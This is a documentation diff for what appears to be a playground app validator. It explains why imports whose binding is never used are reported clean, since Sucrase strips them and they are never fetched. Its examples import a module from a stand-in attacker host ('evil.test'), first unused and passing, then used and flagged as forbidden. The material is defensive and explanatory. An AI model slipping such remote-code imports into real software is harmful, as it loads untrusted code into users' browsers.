@@ -100,6 +100,33 @@ npm run validate:apps:test -w playground
   `tsc` over the SDK re-export files, which is where the truth lives.
 - **Subpath walking** (`resolveSubpaths`), which needs the registry's actual
   values rather than its keys.
+- **Imports whose binding is never used.** Sucrase elides them, on the
+  assumption that an unused import was a type import. See below - this is not
+  the hole it looks like.
+
+### Unused imports report clean, and that is correct
+
+An import nobody references does not appear in `imports`, and no policy flag
+fires on it:
+
+```ts
+// Reported as ok, with imports: []
+import evil from 'https://evil.test/x.js';
+export default function App() { return null; }
+```
+
+That is not validation missing something. The same Sucrase pass runs in the
+browser, so the specifier is stripped from the compiled output too - the module
+is never requested at runtime. Validation and execution agree; there is nothing
+to catch because nothing happens.
+
+Use the binding and both react as you would expect:
+
+```ts
+// ok: false - forbidden-import -> https://evil.test/x.js
+import evil from 'https://evil.test/x.js';
+export default function App() { return evil; }
+```
 
 ## Why it never evaluates
 
